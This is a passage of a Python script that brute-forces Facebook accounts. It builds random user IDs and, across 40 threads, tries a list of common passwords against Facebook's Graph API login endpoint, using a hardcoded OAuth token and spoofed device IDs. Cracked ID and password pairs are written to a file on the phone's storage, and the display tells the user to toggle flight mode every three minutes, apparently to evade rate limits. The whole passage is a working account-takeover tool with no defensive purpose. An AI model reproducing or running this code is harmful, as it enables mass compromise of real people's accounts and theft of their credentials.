        khalifa = str(random.randint(1000000000, 1999999999))
        user.append(khalifa)
    
    with tred(max_workers=40) as ____D_O_N____:
        clear()
        tl = str(len(user))
        print(f'{xd} TOTAL LIMIT {bx}:{wx} {tl} ')
        print(f'{xd} FLIGHT MODE {wx}ON{bx}|{wx}OFF{gx} EVERY {wx}3{gx} MINUTES ')
        linex()
        
        for lover in user:
            ids = ___B_A_L___ + lover
            passlist = ['123456', '1234567', '12345678', '123456789', '123123', '143143', '1234567890', '112233']
            ____D_O_N____.submit(___M_T_D_X___, ids, passlist)
    
    linex()
    print(f"\n{wx}{'-----------------------------------------------'}")
    print(f'{xd} THE PROCESS HAS COMPLETED')
    print(f'{xd} TOTAL OK UID {bx}:{gx} {len(oks)}')
    print(f"\n{wx}{'-----------------------------------------------'}")
    input(f'{xd} PRESS ENTER TO CONTINUE ')
    exit()

def ___M_T_D_X___(ids, passlist):
    global loop
    global oks
    
    xp = f'{bx}[{gx}MR{bx}]{gx}'
    sys.stdout.write(f'\r{xp}-\033[1;90m[\033[1;32mGEN\033[1;90m] \033[1;37m{loop}\033[1;90m|\033[1;37mOK:-\033[1;32m{len(oks)}\033[1;90m|\033[1;37mCP:-\033[38;5;205m{len(cps)}\033[1;90m|\033[1;37m2FA:-\033[38;5;214m{len(twf)} ')
    sys.stdout.flush()
    
    ua = get_ua()
    
    for pas in passlist:
        try:
            data = {
                'adid': str(uuid.uuid4()),
                'email': ids,
                'password': pas,
                'cpl': 'true',
                'credentials_type': 'device_based_login_password',
                'source': 'device_based_login',
                'error_detail_type': 'button_with_disabled',
                'format': 'json',
                'generate_session_cookies': '1',
                'generate_analytics_claim': '1',
                'generate_machine_id': '1',
                'family_device_id': str(uuid.uuid4()),
                'advertiser_id': str(uuid.uuid4()),
                'locale': 'en_US',
                'client_country_code': 'US',
                'device_id': str(uuid.uuid4())
            }
            
            headers = {
                'content-type': 'application/x-www-form-urlencoded',
                'Host': 'graph.facebook.com',
                'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                'user-agent': ua
            }
            
            response = requests.post('https://graph.facebook.com/auth/login', data=data, headers=headers, timeout=30)
            po = response.json()
            
            if 'access_token' in po:
                uid = po.get('uid', '')
                year = tutulx(str(uid))
                print(f'\r\033[1;90m[\033[1;32mGEN-OK\033[1;90m]\033[1;32m {uid} | {pas}\033[1;97m \033[1;90m•> \033[1;92m{year}')
                
                try:
                    os.system('espeak -a 300 "GEN Ok id"')
                except:
                    pass
                
                with open('/sdcard/GEN-OLD-OK.txt', 'a') as f:
                    f.write(f'{uid}|{pas}\n')
                
                oks.append(uid)
                break
            
            if 'error' in po and 'www.facebook.com' in str(po.get('error', {}).get('message', '')):
                uid = po.get('error', {}).get('error_data', {}).get('uid', '')
                year = tutulx(str(uid))
                print(f'\r\033[1;90m[\033[1;32mGEN-OK\033[1;90m]\033[1;32m {uid} | {pas}\033[1;97m \033[1;90m•> \033[1;92m{year}')
                
                try:
                    os.system('espeak -a 300 "GEN Ok id"')
                except:
                    pass
                
                with open('/sdcard/GEN-OLD-OK.txt', 'a') as f:
                    f.write(f'{uid}|{pas}\n')
                
                oks.append(uid)
                break
                
        except Exception as e:
            continue
    
    loop += 1

if __name__ == "__main__":
    try:
        Menu()
    except KeyboardInterrupt:
        print(f'\n{xd} PROCESS STOPPED BY USER')
        exit()
    except Exception as e:
        print(f'\n{xd}{rx} ERROR: {str(e)}')
        exit()
